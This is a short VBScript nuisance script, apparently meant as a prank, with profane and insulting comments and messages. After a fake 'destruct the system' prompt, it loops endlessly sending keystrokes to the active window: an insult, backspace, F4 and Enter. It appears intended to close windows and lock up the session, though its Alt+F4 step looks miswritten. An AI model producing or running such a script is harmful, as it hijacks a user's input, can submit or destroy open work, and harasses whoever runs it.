' I'm Sorry But Are you A big Stupid.
FuckSystem = true
Set wshShell =wscript.CreateObject("WScript.Shell") 
Set oWMP = CreateObject("WMPlayer.OCX.7") 
Set colCDROMs = oWMP.cdromCollection
function crush()
if True Then
    a = msgbox("Are you sure for Destruct the system?",48,"Select Anything.")
    MsgBox ("Let's go back a few steps !!!")
    do 

    wscript.sleep 100   
    wshshell.sendkeys "SORRY BITCH"
    wshshell.sendkeys "{BS}"
    wshshell.sendkeys "{%}"
    wshshell.sendkeys "{F4}"
    wshshell.sendkeys "{ENTER}"

    loop
else
    msgbox("Do TRUE FuckSystem.")
end if
end function
crush()